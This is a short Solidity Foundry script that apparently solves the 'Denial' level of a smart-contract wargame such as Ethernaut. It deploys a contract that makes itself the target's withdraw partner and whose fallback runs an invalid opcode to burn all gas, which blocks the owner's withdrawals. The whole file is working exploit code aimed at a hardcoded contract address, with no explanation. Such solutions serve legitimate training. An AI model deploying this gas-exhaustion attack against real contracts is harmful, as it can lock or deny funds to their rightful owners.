// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract DenialSolution is Script {
    address target = 0xa6F36141390d4c775aC356855704Ad925c70bef3;

    function run() external {
        vm.startBroadcast();
        new Hack(Denial(payable(target)));
        vm.stopBroadcast();
    }
}

contract Hack {
    constructor(Denial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}
